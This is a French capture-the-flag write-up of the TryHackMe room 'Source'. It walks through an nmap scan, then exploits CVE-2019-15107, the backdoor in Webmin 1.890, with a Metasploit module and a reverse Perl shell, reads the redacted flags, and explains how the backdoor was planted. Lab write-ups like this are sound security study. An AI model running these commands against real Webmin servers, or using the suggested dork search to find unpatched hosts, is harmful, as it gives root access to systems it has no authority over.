---
title: "Write-up | Source"
date: 2020-07-09T17:06:50+02:00
draft: false
tags:
  - writeup
  - tryhackme
---

Ce write-up sera consacré à la room Source, sur [Try Hack Me](https://tryhackme.com).

Synopsis :
> Exploit a recent vulnerability and hack Webmin, a web-based system configuration tool.

## Reconnaissance

Premier scan de ports avec `nmap` :
```
$ nmap -sV -sC 10.10.119.71 -oN scans/ports.txt
PORT      STATE    SERVICE       VERSION
22/tcp    open     ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
2718/tcp  filtered pn-requester2
10000/tcp open     http          MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Pas de serveur web sur le port 80, mais il y a un service que je ne connais pas sur le port 10000, vu le nom du service il est possible que ça soit un serveur web.
En allant sur la page je vois le message :
```
This web server is running in SSL mode. 
```
J'essaie donc en https et tombe sur une page de connection du service Webmin.
Après une recherche rapide, il semblerait qu'il y ai une vulnérabilité assez sévère sur les versions de Webmin < 1.920.

## Exploitation

Un module `metasploit` est disponible pour cette vulnérabilité, je vais l'utiliser.
```
msf5 > use exploit/linux/http/webmin_backdoor
[*] Using configured payload cmd/unix/reverse_perl
msf5 exploit(linux/http/webmin_backdoor) > set lhost 10.8.37.193
lhost => 10.8.37.193
msf5 exploit(linux/http/webmin_backdoor) > set rhost 10.10.119.71
rhost => 10.10.119.71
msf5 exploit(linux/http/webmin_backdoor) > set ssl true
[!] Changing the SSL option's value may require changing RPORT!
ssl => true
msf5 exploit(linux/http/webmin_backdoor) > exploit
```
Il faut penser à mettre l'option SSL à true.

Une fois connecté, je commence par regarder qui je suis :
```
whoami
root
```
:)

Je regarde ensuite le contenu du `/home`, et enfin lire le flag utilisateur :
```
whoami
root
ls /home/dark
user.txt
webmin_1.890_all.deb
cat /home/dark/user.txt
THM{[edited]}
```

puis le contenu de `/root/root.txt` :
```
cat /root/root.txt
THM{[edited]}
```

Voilà :)

## Détails sur la vulnérabilité
La CVE associée à la vulnérabilité que j'ai exploité est la [CVE-2019-15107](https://www.cvedetails.com/cve/CVE-2019-15107/).

La version 1.890 a été publiée avec un backdoor qui n'a pas été vu par les équipes de dévelopement. D'après l'[article publié par Webmin](http://www.webmin.com/exploit.html) à ce sujet, leur serveur de developement a été compromis, et l'attaquant a ajouté au script `password_change.cgi` une vulnérabilité. Le timestamp du fichier a été modifié pour pas que ce changement apparaisse avec la commande `git diff`. Il a été patché quelques temps plus tard mais l'attaquant a pu re-modifier la version 1.900. Webmin est donc définitivement patché pour cette vulnérabilité à partir de la version 1.930.

Au vu de la difficulté, je pense que cette room était surtout pour faire une démonstration de l'importance des mises à jour :)

Je suis sûr qu'avec de simples google dorks, on peut trouver une floppée de serveurs Webmin non patchés.
